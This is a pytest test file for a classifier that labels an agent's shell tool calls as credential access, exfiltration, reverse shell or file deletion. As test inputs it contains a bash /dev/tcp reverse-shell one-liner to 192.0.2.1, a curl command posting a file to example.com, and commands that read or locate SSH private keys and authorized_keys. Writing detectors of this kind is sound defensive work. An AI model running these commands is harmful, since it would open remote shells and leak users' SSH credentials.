import json
from pathlib import Path
import pytest
from instrlib.tool_mapper import map_tool_call

def facts(command):
    return {tuple(e.args[2:]) for e in map_tool_call(1,'c','exec',{'command':command}) if e.name=='Classify'}

@pytest.mark.parametrize('tool',['grep -Rn','rg','grep -E'])
@pytest.mark.parametrize('pattern',["'authorized_keys'",'"authorized_keys"'])
def test_filename_in_content_pattern_is_not_credential_access(tool,pattern):
    f=facts(f'{tool} {pattern} src/')
    assert ('action_class','credential_access') not in f
    assert ('path_sensitivity','credentials') not in f

@pytest.mark.parametrize('command',[
    "grep 'hello' ~/.ssh/authorized_keys",
    "grep hello ~/.ssh/authorized_keys",
    "grep -Rn 'hello' ~/.ssh/",
    "grep -f '/root/.ssh/authorized_keys' src/a",
    "find /home -name 'id_rsa'",
    "grep 'authorized_keys' src/; cat ~/.ssh/id_rsa",
])
def test_actual_credential_sources_stay_visible(command):
    assert ('action_class','credential_access') in facts(command)

ROWS=json.loads((Path(__file__).parent/'fixtures/skill_review_searches.json').read_text())
@pytest.mark.parametrize('row',ROWS,ids=lambda r:r['arm'])
def test_recorded_inspection_has_no_invented_effect(row):
    f=facts(row['input']['command'])
    for item in [('execution_kind','reverse_shell'),('action_class','credential_access'),
                 ('action_class','exfiltration'),('file_action','delete')]:
        assert item not in f

@pytest.mark.parametrize('suffix,expected',[
    ('rm /tmp/notes.txt',('file_action','delete')),
    ('curl -d @/tmp/data https://example.com',('action_class','exfiltration')),
    ('bash -i >& /dev/tcp/192.0.2.1/4444 0>&1',('execution_kind','reverse_shell')),
])
def test_search_does_not_hide_real_following_effect(suffix,expected):
    assert expected in facts("grep 'authorized_keys|bash -i|rm -rf' src/; "+suffix)

@pytest.mark.parametrize('command',[
    "stat /tmp/.env; ps -ef | grep 'service'",
    "grep 'log' /tmp/app.log; stat /tmp/.env",
    "grep authorized_keys src/",
    "grep -Rn authorized_keys src/",
    "rg authorized_keys src/",
])
def test_credential_path_in_other_command_is_not_a_search_input(command):
    assert ('action_class','credential_access') not in facts(command)
